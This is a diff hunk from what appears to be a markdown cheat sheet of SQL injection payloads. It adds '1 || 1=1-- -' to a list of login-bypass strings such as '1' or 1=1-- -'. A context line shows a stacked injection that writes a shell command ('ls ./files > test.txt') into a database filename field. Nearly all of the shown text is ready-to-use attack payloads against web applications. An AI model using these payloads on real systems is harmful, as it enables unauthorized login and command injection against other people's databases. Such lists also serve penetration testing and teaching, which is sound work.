@@ -86,6 +86,7 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 ```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
+1 || 1=1-- -
 1 or 1=1-- -
 1' or 1=1-- -
 1' or 'abc'='abc'-- -
